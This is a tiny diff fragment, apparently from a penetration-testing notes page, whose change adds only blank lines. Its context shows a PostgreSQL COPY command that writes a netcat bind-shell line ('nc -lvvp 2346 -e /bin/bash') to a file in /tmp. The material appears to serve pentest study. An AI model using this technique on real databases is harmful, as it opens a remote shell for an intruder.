@@ -14,3 +14,5 @@ updated_at: '2023-04-10T20:23:17.646217+00:00'
 ```bash
 COPY (SELECT 'nc -lvvp 2346 -e /bin/bash') TO '/tmp/pentestlab';
 ```
+
+
